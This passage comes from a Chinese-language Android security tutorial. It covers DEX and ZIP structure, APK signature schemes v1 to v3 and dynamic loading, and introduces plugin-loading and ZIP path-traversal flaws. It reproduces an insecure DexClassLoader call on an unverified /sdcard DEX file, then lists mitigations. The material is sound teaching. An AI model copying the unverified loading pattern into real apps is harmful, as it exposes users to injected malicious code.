src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/3.png\"></p>\n<p>我们可以发现dex文件主要由3大部分组成，分别是：<code>文件头、索引区、数据区</code>。其中索引区主要包括字符串、类型、方法、域、方法的索引。数据区主要包括类的定义、数据区、链路数据区</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/4.png\"></p>\n<p>上面我们可以看出Dex文件由许多部分组成，其中Dex Header最为重要，因为Dex的其他组成部分，都需要通过Dex Header中的索引才能找到</p>\n<h4 id=\"（1）Dex-Header\"><a href=\"#（1）Dex-Header\" class=\"headerlink\" title=\"（1）Dex Header\"></a>（1）Dex Header</h4><p>dex文件头一般固定为0x70个字节大小，包括标志、版本号、校验码、sha-1签名以及其他一些方法、类的数量和偏移地址等信息。如图所示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/5.png\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/6.png\"></p>\n<p>结合上面的两张图进行对照，下面我们进一步详细的描述dex文件的结构</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/7.png\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/8.png\"></p>\n<h4 id=\"（2）索引区\"><a href=\"#（2）索引区\" class=\"headerlink\" title=\"（2）索引区\"></a>（2）索引区</h4><p>dex文件索引区主要是对一些字符串、类型、方法、域、方法的索引，方法可以查找到对应的数据位置</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/9.png\" alt=\"image-20220221104633099\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/10.png\" alt=\"image-20220221103446888\"></p>\n<h4 id=\"（3）数据区\"><a href=\"#（3）数据区\" class=\"headerlink\" title=\"（3）数据区\"></a>（3）数据区</h4><p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/11.png\" alt=\"image-20220221105433209\"></p>\n<p>数据区一般包括类的定义区、数据区、链接数据区。类的定义区一般存放dex文件中一些类对象的声明，数据区则存放代码原数据，链接数据区一般提供从索引区到数据区的链接映射关系</p>\n<h3 id=\"2-Zip文件结构\"><a href=\"#2-Zip文件结构\" class=\"headerlink\" title=\"2. Zip文件结构\"></a>2. Zip文件结构</h3><p>zip文件是比较常见的压缩文件，我们先来看一下zip文件的基本结构图：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/12.png\" alt=\"image-20220221111055116\"></p>\n<p>通过图中我们可以看出，zip文件一般分为三个部分：源文件数据存储区、中心目录区、中心目录结束标识</p>\n<h4 id=\"（1）源文件数据存储区\"><a href=\"#（1）源文件数据存储区\" class=\"headerlink\" title=\"（1）源文件数据存储区\"></a>（1）源文件数据存储区</h4><p>记录着压缩的所有文件的内容信息，其数据组织结构是每个文件都由local file header、file data、data descriptor三部分组成</p>\n<h5 id=\"lt-1-gt-file-header\"><a href=\"#lt-1-gt-file-header\" class=\"headerlink\" title=\"&lt;1&gt; file header\"></a>&lt;1&gt; file header</h5><p>用于标识文件的开始，文件结构如下：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/13.png\" alt=\"image-20220221111755433\"></p>\n<h5 id=\"lt-2-gt-file-data\"><a href=\"#lt-2-gt-file-data\" class=\"headerlink\" title=\"&lt;2&gt;file data\"></a>&lt;2&gt;file data</h5><p>主要存放相应的压缩文件的源数据</p>\n<h5 id=\"lt-3-gt-data-descriptor\"><a href=\"#lt-3-gt-data-descriptor\" class=\"headerlink\" title=\"&lt;3&gt;data descriptor\"></a>&lt;3&gt;data descriptor</h5><p>一般用于标识该文件压缩结束，该结构只有在相应的header中通用标记字段的第３位设为１时才会出现，紧接在压缩文件源数据后。这个数据描述符只用在不能对输出的 ZIP 文件进行检索时使用。例如：在一个不能检索的驱动器（如：磁带机上）上的 ZIP 文件中。如果是磁盘上的ZIP文件一般没有这个数据描述符。</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/14.png\" alt=\"image-20220221112109956\"></p>\n<h4 id=\"（2）中心目录区\"><a href=\"#（2）中心目录区\" class=\"headerlink\" title=\"（2）中心目录区\"></a>（2）中心目录区</h4><p>对于待压缩的目录而言，每一个子目录对应一个压缩目录源数据，记录该目录的描述信息。压缩包中所有目录源数据连续存储在整个归档包的最后，这样便于向包中追加新的文件。头部的结构如下：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/15.png\" alt=\"image-20220221112226588\"></p>\n<h4 id=\"（3）中心目录结束标识\"><a href=\"#（3）中心目录结束标识\" class=\"headerlink\" title=\"（3）中心目录结束标识\"></a>（3）中心目录结束标识</h4><p>目录结束标识存在于整个归档包的结尾，用于标记压缩的目录数据的结束，结构如下：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/16.png\" alt=\"image-20220221112404675\"></p>\n<h3 id=\"3-Android-APK签名机制\"><a href=\"#3-Android-APK签名机制\" class=\"headerlink\" title=\"3.Android APK签名机制\"></a>3.Android APK签名机制</h3><p>应用签名主要是避免外部恶意解压、破解或者反编译修改内容，签名的本质是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">认证：Android 平台上运行的每个应用都必须有开发者的签名。在安装应用时，软件包管理器会验证 APK 是否已经过适当签名，安装程序会拒绝没有获得签名就尝试安装应用</span><br><span class=\"line\">验证完整性：软件包管理器在安装应用前会验证应用摘要，如果破解者修改了 apk 里的内容，那么摘要就不再匹配，验证失败</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/17.png\" alt=\"image-20220221141751025\"></p>\n<h4 id=\"（1）应用签名方案类型\"><a href=\"#（1）应用签名方案类型\" class=\"headerlink\" title=\"（1）应用签名方案类型\"></a>（1）应用签名方案类型</h4><p>截止到Android12，Android支持三种应用签名方案：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">v1:基于jar签名</span><br><span class=\"line\">v2:提高验证性能&amp;覆盖范围（Android 7.0 Nougat引入）</span><br><span class=\"line\">v3:支持密钥轮换（Android 9.0 Pie引入）</span><br></pre></td></tr></table></figure>\n\n<p>为了提高兼容性，必须按照v1,v2,v3的先后顺序采用签名方案，低版本平台会忽略高版本的签名方案在APK中添加额外数据，具体流程图如下：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/18.png\" alt=\"image-20220221141751025\"></p>\n<h5 id=\"lt-1-gt-签名方案v1\"><a href=\"#lt-1-gt-签名方案v1\" class=\"headerlink\" title=\"&lt;1&gt;签名方案v1\"></a>&lt;1&gt;签名方案v1</h5><p>最基本的签名方案，是基于Jar的签名</p>\n<p>v1签名后会增加META-INF文件夹，其中会有如下三个文件：</p>\n<table>\n<thead>\n<tr>\n<th>文件</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>「MANIFEST.MF」</strong></td>\n<td>记录「apk 中每一个文件对应的摘要」（除了 META-INF 文件夹）</td>\n</tr>\n<tr>\n<td><strong>「*.SF」</strong></td>\n<td>记录「MANIFEST.MF 文件的摘要」和「MANIFEST.MF 中每个数据块的摘要」</td>\n</tr>\n<tr>\n<td><strong>「*.RSA」</strong></td>\n<td>包含了「*.SF 文件的签名」和「包含公钥的开发者证书」</td>\n</tr>\n</tbody></table>\n<p>v1签名流程：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/19.png\" alt=\"image-20220221142628252\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）计算每个文件的 SHA-<span class=\"number\">1</span> 摘要，进行 BASE64 编码后写入摘要文件，即 MANIFEST.MF 文件；</span><br><span class=\"line\">（<span class=\"number\">2</span>）计算整个 MANIFEST.MF 文件的 SHA-<span class=\"number\">1</span> 摘要，进行 BASE64 编码后写入签名文件，即*.SF 文件；</span><br><span class=\"line\">（<span class=\"number\">3</span>）计算 MANIFEST.MF 文件中每一块摘要的 SHA-<span class=\"number\">1</span> 摘要，进行 BASE64 编码后写入 签名文件，即*.SF 文件；</span><br><span class=\"line\">（<span class=\"number\">4</span>）计算整个 *.SF 文件的数字签名（先摘要再私钥加密）；</span><br><span class=\"line\">（<span class=\"number\">5</span>）将数字签名和 X<span class=\"number\">.509</span> 开发者数字证书（公钥）写入 *.RSA 文件；</span><br></pre></td></tr></table></figure>\n\n<p>验证流程：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/20.png\" alt=\"image-20220221143020002\"></p>\n<p>主要包括验证签名、校验完整性两个步骤：</p>\n<p>步骤1：验证签名步骤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）取出*.RSA 中包含的开发者证书，并校验其合法性</span><br><span class=\"line\">（2）用证书中的公钥解密*.RSA中包含的签名</span><br><span class=\"line\">（3）用证书中的公钥计算*.SF的签名</span><br><span class=\"line\">（4）对比（2）和（3）的签名是否一致</span><br></pre></td></tr></table></figure>\n\n<p>步骤2：验证完整性</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）检查 APK 中包含的所有文件，对应的摘要值与 MANIFEST.MF 文件中记录的值一致</span><br><span class=\"line\">（<span class=\"number\">2</span>）使用证书文件（RSA 文件）检验签名文件（SF 文件）没有被修改过</span><br><span class=\"line\">（<span class=\"number\">3</span>）使用签名文件（SF 文件）检验 MF 文件没有被修改过</span><br></pre></td></tr></table></figure>\n\n<p>上面任何一个步骤验证失败，则整个APK验证失败</p>\n<p>问题：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">覆盖范围不足：Zip 文件中部分内容不在验证范围，例如 META-INF 文件夹；</span><br><span class=\"line\">验证性能差：验证程序必须解压所有压缩的条目，这需要花费更多时间和内存</span><br><span class=\"line\">存在Janus漏洞：恶意开发人员可以通过Janus漏洞去绕过Android 的v1签名验证机制</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-签名方案v2\"><a href=\"#lt-2-gt-签名方案v2\" class=\"headerlink\" title=\"&lt;2&gt;签名方案v2\"></a>&lt;2&gt;签名方案v2</h5><p>Android7.0 中开始引入了APK签名方案v2，一种全文件签名方案，该方案能够发现对APK的受保护部分进行所有更改，相比v1来说校验速度更快，覆盖的范围也更广。但是考虑到版本兼容的问题，所以一般常见了v1+v2的混合签名模式</p>\n<p>我们由上文知道Zip文件主体分为：<code>源文件数据存储区、中心目录区、中心目录结束标识</code>。EoCD中记录了中央目录的起始位置，在<code>源文件数据存储区</code>和<code>中心目录区</code>插入其他数据不会影响Zip的解压</p>\n<p>因此v2签名后会在<code>源文件数据存储区</code>和<code>中心目录区</code>插入APK 签名分块（APK Signing Block）</p>\n<p>如下图所示。从左到右边，我们定义为区块 1~4</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/21.png\" alt=\"image-20220221151257690\"></p>\n<p>v2签名块（APK Signing Block）本身又主要分成三部分:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SignerData（签名者数据）：主要包括签名者的证书，整个APK完整性校验hash，以及一些必要信息</span><br><span class=\"line\">Signature（签名）：开发者对SignerData部分数据的签名数据</span><br><span class=\"line\">PublicKey（公钥）：用于验签的公钥数据</span><br></pre></td></tr></table></figure>\n\n<p><strong>签名流程：</strong></p>\n<p>​\t\t相比v1签名方案，v2签名方案不再以文件为单位计算摘要，而是以1MB为单位将文件拆分为多个连续的快（chunk），每个分区的最后一个快可能会小于1MB。v2签名流程如下：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/22.png\" alt=\"image-20220221151319198\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）对区块 <span class=\"number\">1</span>、<span class=\"number\">3</span>、<span class=\"number\">4</span>，按照 1MB 大小分割为多个块（chunk）</span><br><span class=\"line\">（<span class=\"number\">2</span>）计算每个块的摘要</span><br><span class=\"line\">（<span class=\"number\">3</span>）计算（<span class=\"number\">2</span>）中所有摘要的签名</span><br><span class=\"line\">（<span class=\"number\">4</span>）添加X<span class=\"number\">.509</span>开发者数字证书（公钥）</span><br></pre></td></tr></table></figure>\n\n<p><strong>验证流程：</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/23.png\" alt=\"image-20220221151544009\"></p>\n<p>因为v2签名机制是在Android 7.0上版本才支持，因此对于Android 7.0以及以上版本，在安装过程中，如果v2 签名块，则必须走 v2 签名机制，不能绕过。否则降级走 v1 签名机制</p>\n<p>v1 和 v2 签名机制是可以同时存在的，其中对于 v1 和 v2 版本同时存在的时候，v1 版本的 META_INF 的 <code>.SF</code> 文件属性当中有一个 <code>X-Android-APK-Signed</code> 属性：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">X-Android-APK-Signed: 2</span><br></pre></td></tr></table></figure>\n\n<p>v2签名本身的验证过程：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/24.png\" alt=\"image-20220221152811530\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）利用PublicKey解密Signature，得到SignerData的hash明文</span><br><span class=\"line\">（2）计算SignerData的hash值</span><br><span class=\"line\">（3）两个值进行比较，如果相同则认为APK没有被修改过，解析出SignerData中的证书。否则安装失败</span><br><span class=\"line\">（4）如果是第一次安装，直接将证书保存在应用信息中</span><br><span class=\"line\">（5）如果是更新安装，即设备中原来存在这个应用，验证之前的证书是否与本次解析的证书相同。若相同，则安装成功，否则失败</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-3-gt-签名方案v3\"><a href=\"#lt-3-gt-签名方案v3\" class=\"headerlink\" title=\"&lt;3&gt;签名方案v3\"></a>&lt;3&gt;签名方案v3</h5><p>Android 9.0中引入了新的签名方式v3，v3签名在v2的基础上，仍然采用检查整个压缩包的校验方式。不同的是在签名部分增可以添加新的证书（Attr块）。在这个新块中，会记录我们之前的签名信息以及新的签名信息， 支持密钥轮换，即以密钥转轮的方案，来做签名的替换和升级。这意味着，只要旧签名证书在手，应用能够在 APK 更新过程中更改其签名密钥。</p>\n<p>v3 签名新增的新块（attr）存储了所有的签名信息，由更小的 Level 块，以链表的形式存储。</p>\n<p><strong>签名流程：</strong></p>\n<p>v3版本签名块也分成同样的三部分，与v2不同的是在SignerData部分，v3新增了attr块，其中是由更小的level块组成。每个level块中可以存储一个证书信息。前一个level块证书验证下一个level证书，以此类推。最后一个level块的证书，要符合SignerData中本身的证书，即用来签名整个APK的公钥所属于的证书。从v2到v3的过渡：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/25.png\" alt=\"image-20220221153113453\"></p>\n<p><strong>签名校验：</strong></p>\n<p>Android 的签名方案的升级都需要确保向下兼容。因此，在引入 v3 方案后会根据 APK 签名方案，v3 -&gt; v2 -&gt; v1 依次尝试验证 APK。而较旧的平台会忽略 v3 签名并尝试 v2 签名，最后才去验证 v1 签名。如下图所示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/26.png\" alt=\"image-20220221152048634\"></p>\n<p>注意：对于覆盖安装的情况，签名校验只支持升级而不支持降级。即一个使用 V1 签名的 Apk，可以使用 V2 签名的 Apk 进行覆盖安装，反之则不允许</p>\n<p>v3签名自身的校验：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/27.png\" alt=\"image-20220221153432708\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）利用PublicKey解密Signature，得到SignerData的hash明文</span><br><span class=\"line\">（<span class=\"number\">2</span>）计算SignerData的hash值</span><br><span class=\"line\">（<span class=\"number\">3</span>）两个值进行比较，如果相同则认为APK没有被修改过，解析出SignerData中的证书。否则安装失败</span><br><span class=\"line\">（<span class=\"number\">4</span>）逐个解析出level块证书并验证，并保存为这个应用的历史证书</span><br><span class=\"line\">（<span class=\"number\">5</span>）如果是第一次安装，直接将证书与历史证书一并保存在应用信息中</span><br><span class=\"line\">（<span class=\"number\">6</span>）如果是更新安装，验证之前的证书与历史证书，是否与本次解析的证书或者历史证书中存在相同的证书，其中任意一个证书符合即可安装</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-4-gt-三种签名的比较和校验时机\"><a href=\"#lt-4-gt-三种签名的比较和校验时机\" class=\"headerlink\" title=\"&lt;4&gt;三种签名的比较和校验时机\"></a>&lt;4&gt;三种签名的比较和校验时机</h5><p>v2、v3的比较如下图所示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/28.png\" alt=\"image-20220221153432708\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">v1签名方案：基于 Jar 的签名方案，但存在的问题：完整性覆盖范围不足 &amp; 验证性能差</span><br><span class=\"line\">v2签名方案：通过条目内容区、中央目录区之间插入APK 签名分块（APK Signing Block）对v1签名进行了优化</span><br><span class=\"line\">v3签名方案：支持密钥轮换，新增的新块（attr）存储了所有的签名信息，对v2签名进行了优化</span><br></pre></td></tr></table></figure>\n\n<p>验证签名的时机主要要了解Android安装应用的方式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">系统应用安装：开机时完成，没有安装界面</span><br><span class=\"line\">网络下载的应用安装：通过市场应用完成，没有安装界面</span><br><span class=\"line\">ADB工具安装：没有安装界面</span><br><span class=\"line\">第三方应用安装：通过packageinstall.apk应用安装，有安装界面</span><br></pre></td></tr></table></figure>\n\n<p>但是其实无论通过哪种方式安装都要通过PackageManagerService来完成安装的主要工作，最终在PMS中会去验证签名信息，如v3验证方式一样</p>\n<h3 id=\"4-Android动态加载\"><a href=\"#4-Android动态加载\" class=\"headerlink\" title=\"4.Android动态加载\"></a>4.Android动态加载</h3><p>Android动态加载总会涉及到插件化、热部署、热修复等，这里我在网上查阅资料后，给大家总结了下动态加载的场景使用和分类：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/1.png\" alt=\"image-20220218172137791\"></p>\n<p>动态加载，就是程序运行时，可以加载外部的可执行文件并运行，这样使得我们可以不用安装apk就可以更新应用，针对一些SDK项目，可以加快app新版本的覆盖率、快速修复线上bug。这里运行时是指应用冷启动并开始工作后，外部可以是SD卡，可以是data目录，也可以是jniLib目录，这些可执行文件是没有随着应用一起编译的的</p>\n<p>动态加载的特点：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）app在运行的时候，可以通过加载一些本身不存在的文件，来实现一定功能，这种经常应用在app更新的过程中</span><br><span class=\"line\">（2）可执行文件是可以替换的，更换静态资源不属于动态加载</span><br><span class=\"line\">（3）动态加载的核心思想就是动态调用外部的dex文件，Android Apk自带的dex是程序入口，所有功能可以直接从服务器中下载dex来完成</span><br></pre></td></tr></table></figure>\n\n<p>Android动态加载按照工作机制不同，可以分为<code>虚拟机层动态加载</code>和<code>Native层动态加载</code>两大类</p>\n<p>这里由于本文主要讲解动态加载方面漏洞，所以对热更新、热修复等原理就不深究了，大家感兴趣可以下去查阅相关资料，动态加载原理详细可以参考我上一篇帖子：<a href=\"https://bbs.pediy.com/thread-271538.htm\">Android加壳脱壳学习（1）——动态加载和类加载机制详解</a></p>\n<h2 id=\"三、插件化和解压缩安全场景和分类\"><a href=\"#三、插件化和解压缩安全场景和分类\" class=\"headerlink\" title=\"三、插件化和解压缩安全场景和分类\"></a>三、插件化和解压缩安全场景和分类</h2><h3 id=\"1-插件化漏洞的安全场景\"><a href=\"#1-插件化漏洞的安全场景\" class=\"headerlink\" title=\"1.插件化漏洞的安全场景\"></a>1.插件化漏洞的安全场景</h3><p>前文我们知道了Android的动态加载机制和签名机制，Android插件化机制具有模块解耦性，可以动态升级按序加载，而且当下很多APP都使用了热部署、热修复、插件化等技术都采用了动态加载技术，这样可以实现APP的快速更新，但是也带来一定的安全隐患，使得很多恶意软件能熬过安全检测，来动态加载代码。而执行加载绕过执行漏洞一般与Android 的签名机制密不可分，所以上文我们也很详细的讲解了Android的签名机制。</p>\n<h3 id=\"2-插件化漏洞的分类\"><a href=\"#2-插件化漏洞的分类\" class=\"headerlink\" title=\"2.插件化漏洞的分类\"></a>2.插件化漏洞的分类</h3><p>很多APP通过动态加载一些dex或so文件，但是考虑到存在动态加载的安全性问题，往往会对加载的文件进行签名校验机制，因此我们可以将插件化漏洞分为两类：动态加载漏洞和签名校验绕过漏洞</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/29.png\" alt=\"image-20220307123657260\"></p>\n<h3 id=\"3-解压缩漏洞的安全场景\"><a href=\"#3-解压缩漏洞的安全场景\" class=\"headerlink\" title=\"3.解压缩漏洞的安全场景\"></a>3.解压缩漏洞的安全场景</h3><p>Android中经常会涉及到解压缩问题，比如动态加载机制，可能下载了apk&#x2F;zip文件，然后在本地做解压工作，还有就是一些资源在本地占用apk包的太大，就也打包成zip放到服务端，使用的时候再下发。Android在解压zip文件，使用的是ZipInputStream和ZipEntry类，代码比较简单，但是ZipEntry.getName的方法存在的漏洞就是返回的是文件名，并没有对特殊字符处理，linux中<code>../</code>可以命令文件但是这个可以进行穿越上层目录，就会带来一定的安全隐患</p>\n<h3 id=\"4-签名机制和解压缩漏洞分类\"><a href=\"#4-签名机制和解压缩漏洞分类\" class=\"headerlink\" title=\"4.签名机制和解压缩漏洞分类\"></a>4.签名机制和解压缩漏洞分类</h3><p>我们这里列举两个典型的漏洞：如下所示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/53.png\" alt=\"image-20220308105246647\"></p>\n<h2 id=\"四、插件化漏洞原理分析和复现\"><a href=\"#四、插件化漏洞原理分析和复现\" class=\"headerlink\" title=\"四、插件化漏洞原理分析和复现\"></a>四、插件化漏洞原理分析和复现</h2><h3 id=\"1-动态加载漏洞\"><a href=\"#1-动态加载漏洞\" class=\"headerlink\" title=\"1.动态加载漏洞\"></a>1.动态加载漏洞</h3><h4 id=\"（1）原理分析\"><a href=\"#（1）原理分析\" class=\"headerlink\" title=\"（1）原理分析\"></a>（1）原理分析</h4><p>Android系统提供类加载器DexClassLoader，可以在运行时动态加载执行包含的JAR或APK文件内的DEX文件，这样可能导致所加载的Dex文件被恶意应用替换或代码注入，如果不对Dex文件进行签名校验，就可能导致加载的是恶意代码，这样就会进一步造成严重危害</p>\n<h4 id=\"（2）案例1——动态加载\"><a href=\"#（2）案例1——动态加载\" class=\"headerlink\" title=\"（2）案例1——动态加载\"></a>（2）案例1——动态加载</h4><p>案例准备：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">原apk</span><br><span class=\"line\">加载dex</span><br></pre></td></tr></table></figure>\n\n<p>我们先编写一个测试类文件,然后生成dex文件，这里我们在dex文件中只加入字符串信息，我们源apk并未加入签名校验机制</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/31.png\" alt=\"image-20220218192716863\"></p>\n<p>我们先将dex文件放到模拟器的sdcard&#x2F;下</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/32.png\" alt=\"image-20211010150449575\"></p>\n<p>我们新建一个程序，然后编写主程序的代码，并授权sd读取权限</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Context</span> <span class=\"variable\">appContext</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.getApplication();</span><br><span class=\"line\">testDexClassLoader(appContext,<span class=\"string\">&quot;/sdcard/classes.dex&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;uses-permission android:name=<span class=\"string\">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br><span class=\"line\">&lt;uses-permission android:name=<span class=\"string\">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>\n\n<p>然后我们编写类加载器代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">testDexClassLoader</span><span class=\"params\">(Context context, String dexfilepath)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//构建文件路径：/data/data/com.emaxple.test02/app_opt_dex，存放优化后的dex,lib库</span></span><br><span class=\"line\">        <span class=\"type\">File</span> <span class=\"variable\">optfile</span> <span class=\"operator\">=</span> context.getDir(<span class=\"string\">&quot;opt_dex&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"type\">File</span> <span class=\"variable\">libfile</span> <span class=\"operator\">=</span> context.getDir(<span class=\"string\">&quot;lib_dex&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"type\">ClassLoader</span> <span class=\"variable\">parentclassloader</span> <span class=\"operator\">=</span> MainActivity.class.getClassLoader();</span><br><span class=\"line\">        <span class=\"type\">ClassLoader</span> <span class=\"variable\">tmpclassloader</span> <span class=\"operator\">=</span> context.getClassLoader();</span><br><span class=\"line\">    <span class=\"comment\">//可以为DexClassLoader指定父类加载器</span></span><br><span class=\"line\">        <span class=\"type\">DexClassLoader</span> <span class=\"variable\">dexClassLoader</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DexClassLoader</span>(dexfilepath,optfile.getAbsolutePath(),libfile.getAbsolutePath(),parentclassloader);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">clazz</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            clazz = dexClassLoader.loadClass(<span class=\"string\">&quot;com.example.test.TestClass&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(clazz!=<span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"type\">Method</span> <span class=\"variable\">testFuncMethod</span> <span class=\"operator\">=</span> clazz.getDeclaredMethod(<span class=\"string\">&quot;test02&quot;</span>);</span><br><span class=\"line\">                <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> clazz.newInstance();</span><br><span class=\"line\">                testFuncMethod.invoke(obj);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (IllegalAccessException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InstantiationException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InvocationTargetException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果显示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/30.png\" alt=\"image-20211010150449575\"></p>\n<p>这里说明加载成功了，如果我们这里写的是一段恶意代码，这样就会进行攻击，造成破坏</p>\n<h4 id=\"（3）安全防护\"><a href=\"#（3）安全防护\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><p>我们上文的动态加载漏洞，是因为源APK并未对加载的dex文件进行签名校验，从而导致容易导入恶意代码，当然从Android 4.4后加入了<strong>对JAR&#x2F;DEX存放目录文件的user_id 和动态加载JAR&#x2F;DEX的进程的user_id是否一致的判断，如果不一致将抛出异常导致加载失败</strong>，这样就很好的可以防范替换加载的dex文件，进行恶意注入</p>\n<p>解决方案：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）将动态加载的DEX/APK文件放置在APK内部或应用私有目录中</span><br><span class=\"line\">（2）使用加密网络协议https进行下载加载的并将其放置在应用私有目录中</span><br><span class=\"line\">（3）对加载的Dex文件进行完整性校验和签名校验</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-签名检验绕过漏洞\"><a href=\"#2-签名检验绕过漏洞\" class=\"headerlink\" title=\"2.签名检验绕过漏洞\"></a>2.签名检验绕过漏洞</h3><h4 id=\"（1）原理分析-1\"><a href=\"#（1）原理分析-1\" class=\"headerlink\" 